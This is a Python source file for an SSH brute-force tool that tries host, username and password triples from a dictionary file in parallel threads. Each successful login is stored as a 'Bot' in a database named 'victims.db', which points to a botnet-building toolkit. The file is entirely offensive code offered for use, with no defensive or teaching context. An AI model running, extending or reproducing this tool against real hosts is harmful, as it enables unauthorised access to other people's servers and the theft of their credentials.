from typing import Any
from pexpect import pxssh
from dataclasses import dataclass
from contextlib import contextmanager
from threading import Thread
from argparse import ArgumentParser
from sqlalchemy import create_engine
from models import Bot
from sqlalchemy.orm import sessionmaker


@dataclass
class SSHBruteForce:
    """
    Create connection ssh to try to connect to target host
    :arg:
    - host: host to connect to
    - user: username to connect to
    - password: password to connect to
    """
    __host: str
    __user: str
    __password: str
    __port: int = 22

    @contextmanager
    def try_to_connect(self) -> Any:
        """
        Create a generator to connect to target host
        :usage:
        with SSHBruteForce.try_to_connect as ssh:
        :return:
        """
        try:
            session: Any = pxssh.pxssh()
            session.login(self.__host, self.__user, self.__password)
        except pxssh.ExceptionPxssh as e:
            print(f"Failed to connect to {self.__host} - {self.__user}")
        else:
            yield session


@dataclass
class BruteForce:
    """
    Read a dictionary to try discover the passwords
    """
    filename: str

    def __parse(self) -> None:
        parse = ArgumentParser(description="Read a dictionary to try find the credentials")
        parse.add_argument("-f", '--file', help="Dictionary [.txt]", type=str, default='passwords.txt')
        args = parse.parse_args()
        self.filename = args.file
        self.__run()

    def __brute(self, host: str, user: str, password: str, port: int = 22) -> None:
        ssh: SSHBruteForce = SSHBruteForce(host, user, password)
        engine = create_engine('sqlite:///../models/victims.db')
        Session = sessionmaker(bind=engine)
        session = Session()
        with ssh.try_to_connect() as conn:
            if conn:
                bot: Bot = Bot(host=host,
                               username=user,
                               password=password,
                               port=port)
                session.add(bot)
                session.commit()
                print(f"Saved")

    def __run(self) -> None:
        with open(self.filename) as f:
            for line in f.readlines():
                host, user, password = line.split(' ')
                Thread(target=self.__brute, args=(host, user, password)).start()

    def start(self) -> None:
        self.__parse()


if __name__ == '__main__':
    bf: BruteForce = BruteForce('passwords.txt')
    bf.start()
